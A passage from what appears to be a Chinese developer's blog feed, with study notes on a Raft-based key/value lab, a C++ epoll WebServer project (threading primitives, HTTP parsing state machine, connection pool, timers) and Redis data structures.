<code>currentTerm</code>，<code>voteFor</code>，<code>log[]</code>，我是有相关变动的时候直接持久化一次。</p><h2 id="2-5-日志压缩和快照"><a href="#2-5-日志压缩和快照" class="headerlink" title="2.5 日志压缩和快照"></a>2.5 日志压缩和快照</h2><p>随着时间推移，存储的日志会越来越多，不但占据很多磁盘空间，服务器重启做日志重放也需要更多的时间。如果没有办法来压缩日志，将会导致可用性问题：要么磁盘空间被耗尽，要么花费太长时间启动。所以日志压缩是必要的。<br>日志快照就是把当前状态记录下来，把该状态前的所有操作信息都丢弃。<br>对于go语言来说，这篇bolg很好的讲了如何让内存不泄露<a href="https://www.cnblogs.com/ithubb/p/14184982.html">go 避免切片内存泄露 - hubb - 博客园 (cnblogs.com)</a><br>快照时间：</p><ul><li><ol><li>服务端触发日志压缩</li></ol></li><li><ol><li>leader发来的InstallSnapshot请求：当收到其他节点的压缩请求后，先上报上层应用，然后再决定是否安装快照。<ul><li>对于 <code>leader</code> 发过来的 <code>InstallSnapshot</code>，只需要判断 <code>term</code> 是否正确，如果无误则 <code>follower</code> 只能无条件接受。</li><li>对于服务上层触发的 CondInstallSnapshot，与上面类似，如果 snapshot 没有更新的话就没有必要去换，否则就接受对应的 snapshot 并处理对应状态的变更。</li></ul></li></ol></li></ul><h1 id="3-基于Raft的分布式KV服务"><a href="#3-基于Raft的分布式KV服务" class="headerlink" title="3 基于Raft的分布式KV服务"></a>3 基于Raft的分布式KV服务</h1><p>这个是在lab2的Raft函数库之上，搭建一个能够容错的key/value存储服务，需要提供强一致性保证。</p><ul><li>强一致性：对于单个请求，整个服务需要表现得像个单机服务，并且对状态机的修改基于之前所有的请求。对于并发的请求，返回的值和最终的状态必须相同，就好像所有请求都是串行的一样。即使有些请求发生在了同一时间，那么也应当一个一个响应。此外，在一个请求被执行之前，这之前的请求都必须已经被完成</li></ul><p>该服务支持三种操作：Put、Append、Get。在内存中维护一个KV数据库。只实现了一般的KV服务，没有实现日志压缩。</p><h2 id="3-1-客户端实现"><a href="#3-1-客户端实现" class="headerlink" title="3.1 客户端实现"></a>3.1 客户端实现</h2><p>需求：客户端发送请求，服务端同步成功并且提交，接着apply后返回给客户端执行结果，但返回客户端时候rpc丢失，客户端只能进行重试直到明确地写入成功或失败为止，但该操作可能已经在服务端应用过了，违背了线性一致性。<br>为了解决上述问题，通过使用<code>clientId</code>和<code>commandId</code>来唯一的标识一个客户端</p><h2 id="3-2-服务端实现"><a href="#3-2-服务端实现" class="headerlink" title="3.2 服务端实现"></a>3.2 服务端实现</h2><p>server结构体与初始化代码实现：</p><ul><li>一个存储kv的map，即状态机，但这里实现一个基于内存版本KV；但实际生产环境下必然不可能把数据全部存在内存当中，系统往往采用的是 LSM 的架构，例如 RocksDB 等，抽象成KVStateMachine 的接口。</li><li>一个能记录某一个客户端最后一次操作序号和应用结果的map</li><li>一个能记录每个raft同步操作结果的map</li></ul><p>kv.applier协程：单独开一个go routine来远程监视apply channel，一旦底层的Raft commit一个到apply channel，状态机就立马执行且通过commandIndex通知到该客户端的NotifyChan,Command函数取消阻塞返回给客户端。<br>主要实现：</p><ol><li>raft同步完成后，也需要判断请求是否为重复请求。因为同一请求可能由于重试会被同步多次。</li><li>当要通过channel返回操作结果时，需判断当前节点为主才返回操作结果，否则返回WrongLeader。</li><li>为了保证强一致性，仅对当前 term 日志的 notifyChan 进行通知，让之前 term 的客户端协程都超时重试。避免leader 降级为 follower 后又迅速重新当选了 leader，而此时依然有客户端协程未超时在阻塞等待，那么此时 apply 日志后，根据 index 获得 channel 并向其中 push 执行结果就可能出错，因为可能并不对应。</li><li>在目前的实现中，读（Get）请求也会生成一条 raft 日志去同步，最简单粗暴的方式保证线性一致性，即LogRead方法。</li></ol><h1 id="5-结语"><a href="#5-结语" class="headerlink" title="5 结语"></a>5 结语</h1><p>做Lab的时候真的痛苦，感觉人都要麻了，到处报错。不过写完之后感觉自己对分布式了解了不少，感谢大佬们留下的文档，没有前人的文章和实现的片段代码我是做不完这个lab的。感谢！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WebServer项目相关</title>
      <link href="/2023/02/27/WebServer%E9%A1%B9%E7%9B%AE%E7%9B%B8%E5%85%B3/"/>
      <url>/2023/02/27/WebServer%E9%A1%B9%E7%9B%AE%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-记录我实现WebServer"><a href="#1-记录我实现WebServer" class="headerlink" title="1. 记录我实现WebServer"></a>1. 记录我实现WebServer</h1><p>reactor/procatar模式均有。<br>我是一步一步实现的，按照<code>lock -&gt; threadpool -&gt; webserver -&gt; http 信息处理 -&gt; 日志处理 -&gt; 数据库池连接-&gt; 处理非活跃连接</code> 这个顺序一步一步实现的</p><h1 id="2-实现"><a href="#2-实现" class="headerlink" title="2 实现"></a>2 实现</h1><h2 id="2-1-I-O-模型"><a href="#2-1-I-O-模型" class="headerlink" title="2.1 I/O 模型"></a>2.1 I/O 模型</h2><ul><li>同步IO：内核向应用程序通知的是就绪事件<ul><li>阻塞IO：调用者调用了某个函数，等待这个函数返回，期间什么也不做，不停的去检查这个函数有没有返回，必须等这个函数返回才能进行下一步动作</li><li>非阻塞IO：非阻塞等待，每隔一段时间就去检测IO事件是否就绪。没有就绪就可以做其他事。非阻塞I/O执行系统调用总是立即返回，不管事件是否已经发生，若事件没有发生，则返回-1，此时可以根据errno区分这两种情况，对于accept，recv和send，事件未发生时，errno通常被设置成eagain</li><li>信号驱动IO：linux用套接口进行信号驱动IO，安装一个信号处理函数，进程继续运行并不阻塞，当IO时间就绪，进程收到SIGIO信号。然后处理IO事件。</li><li>IO复用：linux用select/poll函数实现IO复用模型，这两个函数也会使进程阻塞，但是和阻塞IO所不同的是这两个函数可以同时阻塞多个IO操作。而且可以同时对多个读操作、写操作的IO函数进行检测。知道有数据可读或可写时，才真正调用IO操作函数</li></ul></li><li>异步IO：linux中，可以调用aio_read函数告诉内核描述字缓冲区指针和缓冲区的大小、文件偏移及通知的方式，然后立即返回，当内核将数据拷贝到缓冲区后，再通知应用程序。</li></ul><h2 id="2-1-reactor-模式如下实现："><a href="#2-1-reactor-模式如下实现：" class="headerlink" title="2.1 reactor 模式如下实现："></a>2.1 reactor 模式如下实现：</h2><ul><li>主线程：<ol><li>监听和建立客户端的连接；</li><li>接收客户端的请求，创建一个任务，并把该任务放入任务队列；</li><li>通知分发线程。</li></ol></li><li>分发线程<ol><li>查看任务队列，看是否有请求任务？没有任务则继续睡觉，否则把任务取出来，然后分发给线程池；</li><li>线程池有空闲的线程，则把该任务交给空闲的线程处理，否则等待。</li></ol></li><li>工作线程<ol><li>执行任务</li><li>销毁任务</li></ol></li></ul><p>1、主线程往epoll 内核事件表中注册socket上的读就绪事件。</p><p>2、主线程调用epoll_wait等待socket上有数据可读。</p><p>3、当socket 上有数据可读时，epoll_wait通知主线程。主线程则将socket可读事件放入请求队列。</p><p>4、睡眠在请求队列上的某个工作线程被唤醒，它从socket读取数据，并处理客户请求，然后往epoll内核事件表中注册该socket上的写就绪事件。</p><p>5、主线程调用epoll_wait等待socket可写。</p><p>6、当socket可写时，epoll_wait通知主线程。主线程将socket可写事件放入请求队列。</p><p>7、睡眠在请求队列上的某个工作线程被唤醒，它往socket上写入服务器处理客户请求的结果。</p><h2 id="2-2-procator"><a href="#2-2-procator" class="headerlink" title="2.2 procator"></a>2.2 procator</h2><p>使用异步I/O模型（以aio_read和 aio_write为例）实现的Proactor模式的工作流程是:</p><p>1、主线程调用aio_read函数向内核注册socket上的读完成事件，并告诉内核用户读缓冲区的位置，以及读操作完成时如何通知应用程序（这里以信号为例，详情请参考sigevent的man手册)。</p><p>2、主线程继续处理其他逻辑。</p><p>3、当socket 上的数据被读入用户缓冲区后，内核将向应用程序发送一个信号，以通知应用程序数据已经可用。</p><p>4、应用程序预先定义好的信号处理函数选择一个工作线程来处理客户请求。工作线程处理完客户请求之后，调用aio_write函数向内核注册socket 上的写完成事件，并告诉内核用户写缓冲区的位置，以及写操作完成时如何通知应用程序（仍然以信号为例)。</p><p>5、主线程继续处理其他逻辑。</p><p>6、当用户缓冲区的数据被写人socket之后，内核将向应用程序发送一个信号，以通知应用程序数据已经发送完毕。</p><p>7、应用程序预先定义好的信号处理函数选择一-个工作线程来做善后处理，比如决定是否关闭socket。</p><p>procatar 模式可以使用reactor模式模拟的：</p><p>1、主线程往epoll内核事件表中注册socket 上的读就绪事件。</p><p>2、主线程调用epoll_wait等待socket上有数据可读。</p><p>3、当socket 上有数据可读时，epoll_wait通知主线程。主线程从socket循环读取数据，直到没有更多数据可读，然后将读取到的数据封装成一个请求对象并插人请求队列。</p><p>4、睡眠在请求队列上的某个工作线程被唤醒，它获得请求对象并处理客户请求，然后往epoll 内核事件表中注册socket上的写就绪事件</p><p>5、主线程调用epoll_wait等待socket可写。</p><p>6）当socket可写时，epoll_wait通知主线程。主线程往socket上写人服务器处理客户请求的结果。</p><p>总的来说：</p><ul><li>reactor模式中，主线程(I/O处理单元)只负责监听文件描述符上是否有事件发生，有的话立即通知工作线程(逻辑单元)，读写数据、接受新连接及处理客户请求均在工作线程中完成。通常由同步I/O实现。</li><li>proactor模式中，主线程和内核负责处理读写数据、接受新连接等I/O操作，工作线程仅负责业务逻辑，如处理客户请求。通常由异步I/O实现。</li></ul><h2 id="2-3-多线程相关实现"><a href="#2-3-多线程相关实现" class="headerlink" title="2.3 多线程相关实现"></a>2.3 多线程相关实现</h2><p>如果要用多线程，需要使用一些使得线程同步的机制</p><h2 id="2-3-1-信号量"><a href="#2-3-1-信号量" class="headerlink" title="2.3.1 信号量"></a>2.3.1 信号量</h2><p>信号量：信号量是一种特殊的变量，它只能取自然数值并且只支持两种操作：等待(P)和信号(V).假设有信号量SV，对其的P、V操作如下：</p><ul><li>P：如果SV的值大于0，则将其减一；若SV的值为0，则挂起执行</li><li>V：如果有其他进行因为等待SV而挂起，则唤醒；若没有，则将SV值加一</li></ul><p>如下就是信号量的一些api:</p><ul><li>sem_init函数用于初始化一个未命名的信号量</li><li>sem_destory函数用于销毁信号量</li><li>sem_wait函数将以原子操作方式将信号量减一,信号量为0时,sem_wait阻塞</li><li>sem_post函数以原子操作方式将信号量加一,信号量大于0时,唤醒调用sem_post的线程</li></ul><h2 id="2-3-2-互斥量"><a href="#2-3-2-互斥量" class="headerlink" title="2.3.2 互斥量"></a>2.3.2 互斥量</h2><p>互斥锁：可以保护关键代码段，以确保独占式访问.当进入关键代码段，获得互斥锁将其加锁；离开关键代码段，唤醒等待该互斥锁的线程。</p><p>以下就是相关api</p><ul><li>pthread_mutex_init函数用于初始化互斥锁</li><li>pthread_mutex_destory函数用于销毁互斥锁</li><li>pthread_mutex_lock函数以原子操作方式给互斥锁加锁</li><li>pthread_mutex_unlock函数以原子操作方式给互斥锁解锁</li></ul><h2 id="2-3-3-条件变量"><a href="#2-3-3-条件变量" class="headerlink" title="2.3.3 条件变量"></a>2.3.3 条件变量</h2><p>条件变量：条件变量提供了一种线程间的通知机制,当某个共享数据达到某个值时,唤醒等待这个共享数据的线程.</p><p>以下就是相关api：</p><ul><li>pthread_cond_init函数用于初始化条件变量</li><li>pthread_cond_destory函数销毁条件变量</li><li>pthread_cond_broadcast函数以广播的方式唤醒所有等待目标条件变量的线程</li><li>pthread_cond_wait函数用于等待目标条件变量。该函数调用时需要传入 mutex参数(加锁的互斥锁) ,函数执行时，先把调用线程放入条件变量的请求队列，然后将互斥锁mutex解锁，当函数成功返回为0时，互斥锁会再次被锁上. 也就是说函数内部会有一次解锁和加锁操作。</li></ul><h2 id="2-4-WebServer实现"><a href="#2-4-WebServer实现" class="headerlink" title="2.4 WebServer实现"></a>2.4 WebServer实现</h2><p>主要使用套接字，套接字有一些使用的比较多的api和参数，在这里写一下：</p><h3 id="2-4-1-epoll相关"><a href="#2-4-1-epoll相关" class="headerlink" title="2.4.1 epoll相关"></a>2.4.1 epoll相关</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><ul><li><p><code>epoll_create() -&gt; int</code>：创建一个epoll句柄，该函数返回一个非负整数作为epoll句柄，如果返回-1则表示创建失败。</p></li><li><p><code>epoll_ctl(int epfd, int op, int fd, struct epoll_event *event) -&gt; int</code>:</p><ul><li><code>epfd</code>：为epoll_creat的句柄</li><li><code>op</code>：表示动作，用3个宏来表示：<ul><li><code>EPOLL_CTL_ADD</code> (注册新的fd到epfd)，</li><li><code>EPOLL_CTL_MOD</code> (修改已经注册的fd的监听事件)，</li><li><code>EPOLL_CTL_DEL</code> (从epfd删除一个fd)；</li></ul></li><li><code>event</code>：告诉内核需要监听的事件<ul><li>EPOLLIN：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）</li><li><code>EPOLLOUT</code>：表示对应的文件描述符可以写</li><li><code>EPOLLPRI</code>：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）</li><li><code>EPOLLERR</code>：表示对应的文件描述符发生错误</li><li><code>EPOLLHUP</code>：表示对应的文件描述符被挂断；</li><li><code>EPOLLET</code>：将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)而言的</li><li><code>EPOLLONESHOT</code>：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里</li></ul></li></ul></li><li><code>epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout) -&gt; int</code>:<ul><li><code>maxevents</code>: 表示events事件大小</li><li><code>timeout</code>：超时时间，<code>-1：阻塞； 0：立即返回，非阻塞；&gt;0 : 指定时间</code></li></ul></li></ul><h4 id="相关重要参数"><a href="#相关重要参数" class="headerlink" title="相关重要参数"></a>相关重要参数</h4><p>ET、LT、EPOLLONESHOT</p><ul><li>LT水平触发模式<ul><li>epoll_wait检测到文件描述符有事件发生，则将其通知给应用程序，应用程序可以不立即处理该事件。</li><li>当下一次调用epoll_wait时，epoll_wait还会再次向应用程序报告此事件，直至被处理</li></ul></li><li>ET边缘触发模式<ul><li>epoll_wait检测到文件描述符有事件发生，则将其通知给应用程序，应用程序必须立即处理该事件</li><li>必须要一次性将数据读取完，使用非阻塞I/O，读取到出现eagain</li></ul></li><li>EPOLLONESHOT<ul><li>解决问题：一个线程读取某个socket上的数据后开始处理数据，在处理过程中该socket上又有新数据可读，此时另一个线程被唤醒读取，此时出现两个线程处理同一个socket</li><li>通过epoll_ctl对该文件描述符注册epolloneshot事件，一个线程处理socket时，其他线程将无法处理，当该线程处理完后，需要通过epoll_ctl重置epolloneshot事件</li></ul></li></ul><h3 id="2-4-2-管道相关"><a href="#2-4-2-管道相关" class="headerlink" title="2.4.2 管道相关"></a>2.4.2 管道相关</h3><p>在这部分实现中，我还用到了管道。</p><ul><li><code>int socketpair(int domain, int type, int protocol, int sv[2]);</code> <ul><li>domain 表示套接字的域（地址族），通常是 AF_UNIX 或 AF_LOCAL。</li><li>type 表示套接字的类型，通常是 SOCK_STREAM 或 SOCK_DGRAM。</li><li>protocol 表示套接字使用的协议，通常为 0（默认）。</li><li>sv 是一个长度为 2 的整型数组，用于存放创建的一对套接字的文件描述符。</li></ul></li></ul><p>在这里管道主要用来接受信号，由于之后要使用定时器来关闭不常使用的连接，定时器发送的信号就用管道来接受。</p><h2 id="2-5-HTTP信息处理相关"><a href="#2-5-HTTP信息处理相关" class="headerlink" title="2.5 HTTP信息处理相关"></a>2.5 HTTP信息处理相关</h2><h3 id="2-5-1-报文格式"><a href="#2-5-1-报文格式" class="headerlink" title="2.5.1 报文格式"></a>2.5.1 报文格式</h3><ul><li><p>请求报文 ：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</p><pre class="language-markup" data-language="markup"><code class="language-markup">GET /562f25980001b1b106000338.jpg HTTP/1.1Host:xxxx.comUser-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36Accept:image/webp,image/*,*/*;q=0.8Referer:http://www.imooc.com/Accept-Encoding:gzip, deflate, sdchAccept-Language:zh-CN,zh;q=0.8空行请求数据为空POST / HTTP1.1Host:www.xxxxxxxx.comUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)Content-Length:40Connection: Keep-Alive空行name=Professional%20Ajax&amp;publisher=Wiley</code></pre></li><li><p>响应报文：HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p></li></ul><h3 id="2-5-2-状态码"><a href="#2-5-2-状态码" class="headerlink" title="2.5.2 状态码"></a>2.5.2 状态码</h3><p>HTTP有5种类型的状态码，具体的：</p><ul><li>1xx：指示信息—表示请求已接收，继续处理。</li><li>2xx：成功—表示请求正常处理完毕。<ul><li>200 OK：客户端请求被正常处理。</li><li>206 Partial content：客户端进行了范围请求。</li></ul></li><li>3xx：重定向—要完成请求必须进行更进一步的操作<ul><li>301 Moved Permanently：永久重定向，该资源已被永久移动到新位置，将来任何对该资源的访问都要使用本响应返回的若干个URI之一。</li><li>302 Found：临时重定向，请求的资源现在临时从不同的URI中获得</li></ul></li><li>4xx：客户端错误—请求有语法错误，服务器无法处理请求。<ul><li>400 Bad Request：请求报文存在语法错误。</li><li>403 Forbidden：请求被服务器拒绝。</li><li>404 Not Found：请求不存在，服务器上找不到请求的资源</li></ul></li><li>5xx：服务器端错误—服务器处理请求出错。<ul><li>500 Internal Server Error：服务器在执行请求时出现错误。</li></ul></li></ul><h3 id="2-5-3-有限状态机-DFA"><a href="#2-5-3-有限状态机-DFA" class="headerlink" title="2.5.3 有限状态机(DFA)"></a>2.5.3 有限状态机(DFA)</h3><p>有限状态机，是一种抽象的理论模型，它能够把有限个变量描述的状态变化过程，以可构造可验证的方式呈现出来。<br>在这里使用有限状态机是因为分类讨论代码会写的比较复杂，并且极容易丢失细节和处理错误。<br>处理HTTP请求过程分为主状态机和从状态机：<br>主状态机有三种状态，表示要解析的东西：</p><ul><li>CHECK_STATE_REQUESTLINE，解析请求行</li><li>CHECK_STATE_HEADER，解析请求头</li><li>CHECK_STATE_CONTENT，解析消息体，仅用于解析POST请求</li></ul><p>主状态机的逻辑：<br>主状态机初始状态是CHECK_STATE_REQUESTLINE，通过调用从状态机来驱动主状态机，在主状态机进行解析前，从状态机已经将每一行的末尾\r\n符号改为\0\0，以便于主状态机直接取出对应字符串进行处理。</p><ul><li>CHECK_STATE_REQUESTLINE<ul><li>主状态机的初始状态，调用parse_request_line函数解析请求行</li><li>解析函数从m_read_buf中解析HTTP请求行，获得请求方法、目标URL及HTTP版本号</li><li>解析完成后主状态机的状态变为CHECK_STATE_HEADER</li></ul></li></ul><p>解析完请求行后，主状态机继续分析请求头。</p><ul><li>CHECK_STATE_HEADER<ul><li>调用parse_headers函数解析请求头部信息</li><li>判断是空行还是请求头，若是空行，进而判断content-length是否为0，如果不是0，表明是POST请求，则状态转移到CHECK_STATE_CONTENT，否则说明是GET请求，则报文解析结束。</li><li>若解析的是请求头部字段，则主要分析connection字段，content-length字段，其他字段可以直接跳过。</li><li>connection字段判断是keep-alive还是close，决定是长连接还是短连接</li><li>content-length字段，这里用于读取post请求的消息体长度</li></ul></li></ul><p>从状态机有三种状态，表示解析的状态：</p><ul><li>LINE_OK，完整读取一行</li><li>LINE_BAD，报文语法有误</li><li>LINE_OPEN，读取的行不完整</li></ul><h3 id="2-5-4-munmap-、mmap"><a href="#2-5-4-munmap-、mmap" class="headerlink" title="2.5.4 munmap()、mmap()"></a>2.5.4 <code>munmap()</code>、<code>mmap()</code></h3><p> mmap()系统调用使得进程之间通过映射同一个普通文件实现共享内存。普通文件被映射到进程地址空间后，进程可以向访问普通内存一样对文件进行访问，不必再调用read()，write（）等操作。<br>在这里是为了提高访问速度，于是就把普通文件映射到逻辑地址。</p><h2 id="2-6-日志处理"><a href="#2-6-日志处理" class="headerlink" title="2.6 日志处理"></a>2.6 日志处理</h2><p>使用单例模式，这里我使用的单例模式做的日志系统。参考的《Effective C++》中的单例模式实现，这种方式不需要加锁和解锁。<br><pre class="language-c++" data-language="c++"><code class="language-c++">class Singleton &#123;public:    static Singleton&amp; getInstance() &#123;        static Singleton instance;        return instance;    &#125;private:    Singleton() &#123;&#125; &#x2F;&#x2F; 禁止通过构造函数创建实例    Singleton(const Singleton&amp; other) &#x3D; delete; &#x2F;&#x2F; 禁止拷贝构造函数    Singleton&amp; operator&#x3D;(const Singleton&amp; other) &#x3D; delete; &#x2F;&#x2F; 禁止赋值运算符&#125;;</code></pre></p><p>由于使用的生产者-消费者模型，使用的前文提到的条件变量做支撑。</p><h2 id="2-7-数据库池"><a href="#2-7-数据库池" class="headerlink" title="2.7 数据库池"></a>2.7 数据库池</h2><p>在一个高并发的应用程序中，如果每次请求都建立一次数据库连接，会带来很大的性能问题，因为每次连接都需要系统创建数据库连接，完成数据库操作，然后系统断开数据库连接等操作，这些都需要占用系统资源和时间。而且频繁地建立和关闭连接还会对数据库服务器造成额外的压力。</p><p>在程序初始化的时候，集中创建多个数据库连接，并把他们集中管理，供程序使用，可以保证较快的数据库读写速度，更加安全可靠。</p><p>使用RAII技巧管理创建、销毁连接池；通过信号量来处理多线程争夺数据库连接的同步机制。</p><h3 id="2-7-1-获取、释放连接"><a href="#2-7-1-获取、释放连接" class="headerlink" title="2.7.1 获取、释放连接"></a>2.7.1 获取、释放连接</h3><ul><li>获取：当线程数量大于数据库连接数量时，使用信号量进行同步，每次取出连接，信号量原子减1，释放连接原子加1，若连接池内没有连接了，则阻塞等待。</li><li>销毁：通过迭代器遍历连接池链表，关闭对应数据库连接，清空链表并重置空闲连接和现有连接数量。</li></ul><h2 id="2-8-用定时器处理不活跃的连接"><a href="#2-8-用定时器处理不活跃的连接" class="headerlink" title="2.8 用定时器处理不活跃的连接"></a>2.8 用定时器处理不活跃的连接</h2><p>LINUX下有三种定时方式：</p><ul><li>socket选项SO_RECVTIMEO和SO_SNDTIMEO</li><li>SIGALRM信号</li><li>I/O复用系统调用的超时参数<br>我使用的<code>SIGALRM</code>信号方式，利用<code>alarm</code>函数周期性地触发<code>SIGALRM</code>信号，信号处理函数利用管道通知主循环，主循环接收到该信号后对升序链表上所有定时器进行处理，若该段时间内没有交换数据，则将该连接关闭，释放所占用的资源。<br>具体用到</li><li><code>#</code>define SIGALRM  14     //由alarm系统调用产生timer时钟信号</li><li><code>#</code>define SIGTERM  15     //终端发送的终止信号</li></ul><h3 id="2-8-1-信号处理机制"><a href="#2-8-1-信号处理机制" class="headerlink" title="2.8.1 信号处理机制"></a>2.8.1 信号处理机制</h3><ul><li><p>信号的接收</p><ul><li>接收信号的任务是由内核代理的，当内核接收到信号后，会将其放到对应进程的信号队列中，同时向进程发送一个中断，使其陷入内核态。注意，此时信号还只是在队列中，对进程来说暂时是不知道有信号到来的。</li></ul></li><li><p>信号的检测</p><ul><li>进程从内核态返回到用户态前进行信号检测</li><li>进程在内核态中，从睡眠状态被唤醒的时候进行信号检测</li><li>进程陷入内核态后，有两种场景会对信号进行检测：</li><li>当发现有新信号时，便会进入下一步，信号的处理。</li></ul></li><li><p>信号的处理</p><ul><li>( 内核 )信号处理函数是运行在用户态的，调用处理函数前，内核会将当前内核栈的内容备份拷贝到用户栈上，并且修改指令寄存器（eip）将其指向信号处理函数。</li><li>( 用户 )接下来进程返回到用户态中，执行相应的信号处理函数。</li><li>( 内核 )信号处理函数执行完成后，还需要返回内核态，检查是否还有其它信号未处理。</li><li>( 用户 )如果所有信号都处理完成，就会将内核栈恢复（从用户栈的备份拷贝回来），同时恢复指令寄存器（eip）将其指向中断前的运行位置，最后回到用户态继续执行进程。</li></ul></li></ul><h3 id="2-8-2-超时设置"><a href="#2-8-2-超时设置" class="headerlink" title="2.8.2 超时设置"></a>2.8.2 超时设置</h3><p>使用升序链表来处理超时连接</p><ul><li>浏览器与服务器连接时，创建该连接对应的定时器，并将该定时器添加到链表上</li><li>处理异常事件时，执行定时事件，服务器关闭连接，从链表上移除对应定时器</li><li>处理定时信号时，将定时标志设置为true</li><li>处理读事件时，若某连接上发生读事件，将对应定时器向后移动，否则，执行定时事件</li><li>处理写事件时，若服务器通过某连接给浏览器发送数据，将对应定时器向后移动，否则，执行定时事件</li></ul><h1 id="3-调试"><a href="#3-调试" class="headerlink" title="3 调试"></a>3 调试</h1><p>我是在ubuntu上用vscode进行开发的，在调试过程中发现了一些问题。可以在命令行中使用以下代码开启管理员模式进而调试。</p><ul><li>OS VERSION : Ubuntu 20.04.2 LTS</li><li>VScode Version : 1.73.1<pre class="language-none"><code class="language-none">sudo code --no-sandbox --disable-gpu-sandbox --user-data-dir&#x3D;&#x2F;root&#x2F;.vscode&#x2F;</code></pre></li></ul><h1 id="4-参考文献"><a href="#4-参考文献" class="headerlink" title="4 参考文献"></a>4 参考文献</h1><ol><li><a href="https://github.com/qinguoyi/TinyWebServer">https://github.com/qinguoyi/TinyWebServer</a></li><li>Linux高性能服务器编程，游双著.</li><li>chatGpt带给我的帮助</li></ol><h1 id="5-实现过程中出现的相关问题"><a href="#5-实现过程中出现的相关问题" class="headerlink" title="5 实现过程中出现的相关问题"></a>5 实现过程中出现的相关问题</h1><h2 id="5-1-线程池相关"><a href="#5-1-线程池相关" class="headerlink" title="5.1 线程池相关"></a>5.1 线程池相关</h2><h3 id="5-1-2-简易线程池实现"><a href="#5-1-2-简易线程池实现" class="headerlink" title="5.1.2 简易线程池实现"></a>5.1.2 简易线程池实现</h3>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库相关</title>
      <link href="/2023/02/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3/"/>
      <url>/2023/02/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="0-存储"><a href="#0-存储" class="headerlink" title="0. 存储"></a>0. 存储</h1><ul><li>缓存很重要，贯穿整个存储体系</li><li>拷贝很昂贵，应该尽量减少</li></ul><h2 id="0-1-RAID技术"><a href="#0-1-RAID技术" class="headerlink" title="0.1 RAID技术"></a>0.1 RAID技术</h2><ul><li>RAID0 ： 多块磁盘简单组合，数据条带化存储，提高磁盘带宽</li><li>RAID1 ： 多块磁盘组合，一块磁盘对应一块额外镜像盘，真是空间利用率为50%，容错能力强</li><li>RAID0 + RAID1</li></ul><h1 id="1-Mysql"><a href="#1-Mysql" class="headerlink" title="1. Mysql"></a>1. Mysql</h1><h1 id="2-Redis"><a href="#2-Redis" class="headerlink" title="2. Redis"></a>2. Redis</h1><h2 id="2-1-为什么需要redis"><a href="#2-1-为什么需要redis" class="headerlink" title="2.1 为什么需要redis"></a>2.1 为什么需要redis</h2><ul><li>数据从单表，演进出了分库页表</li><li>Mysql从单机演进出了集群<ul><li>数据量增加</li><li>读写数据压力不断增大</li></ul></li><li>数据分冷热 ：将热数据存储到内存</li></ul><h2 id="2-2-基本工作原理"><a href="#2-2-基本工作原理" class="headerlink" title="2.2 基本工作原理"></a>2.2 基本工作原理</h2><ul><li>数据从内存中读写</li><li>数据保存到硬盘上防止重启数据丢失<ul><li>增量数据保存到AOF文件（append only file）</li><li>全量数据RDB文，重启redis先读RDB，在读AOF文件</li></ul></li><li>单线程处理所有操作命令</li></ul><h3 id="2-2-1-string数据结构"><a href="#2-2-1-string数据结构" class="headerlink" title="2.2.1 string数据结构"></a>2.2.1 string数据结构</h3><ul><li>可以存储字符串、数字、二进制文件</li><li>通常和expire配合使用</li><li>场景：存储计数、Session<br>存在<code>len</code>, <code>alloc</code> , <code>flags</code> , <code>buf</code>字段。</li></ul><h3 id="2-2-2-list-数据结构"><a href="#2-2-2-list-数据结构" class="headerlink" title="2.2.2 list 数据结构"></a>2.2.2 list 数据结构</h3><ul><li>使用场景：消息通知，如当文章更新时，将更新后的文章推送到ES，用户就能搜索到最新的文章数据</li><li>Quicklist : 比普通list多一个listpack<ul><li>listpack: 开辟了一个比较大的内存空间，存在<code>tot-bytes</code>,<code>num-element</code>,<code>element-1</code>,<code>element-2</code>,…,<code>element-N</code>,<code>listpack-end-byte</code></li></ul></li></ul><h3 id="2-2-3-哈希"><a href="#2-2-3-哈希" class="headerlink" title="2.2.3 哈希"></a>2.2.3 哈希</h3><ul><li>使用场景：计数</li><li>rehash：数据量大得时候，迁移过程会明显阻塞用户请求</li><li>渐进式rehash：每次用户访问迁移少量数据，整个迁移过程会平摊到所有得访问用不请求过程。</li></ul><h3 id="2-2-4-zset"><a href="#2-2-4-zset" class="headerlink" title="2.2.4 zset"></a>2.2.4 zset</h3><ul><li>使用场景：积分榜排名</li><li>使用的跳表+哈希数据结构：</li></ul><h3 id="2-2-5-setnx"><a href="#2-2-5-setnx" class="headerlink" title="2.2.5 setnx"></a>2.2.5 setnx</h3><ul><li>使用场景：分布式锁</li><li>使用redis的setnx实现，利用了两个特性<ul><li>redis是单线程执行命令</li><li>setnx只有未设置过才能执行成功<br>不能保证高可用分布式锁：</li></ul></li></ul><h2 id="2-3-Redis应用案例"><a href="#2-3-Redis应用案例" class="headerlink" title="2.3 Redis应用案例"></a>2.3 Redis应用案例</h2><p>限流（string）</p><h2 id="2-4-使用注意事项"><a href="#2-4-使用注意事项" class="headerlink" title="2.4 使用注意事项"></a>2.4 使用注意事项</h2><h4 id="2-4-1-大key"><a href="#2-4-1-大key" class="headerlink" title="2.4.1 大key"></a>2.4.1 大key</h4><ul><li>大key: 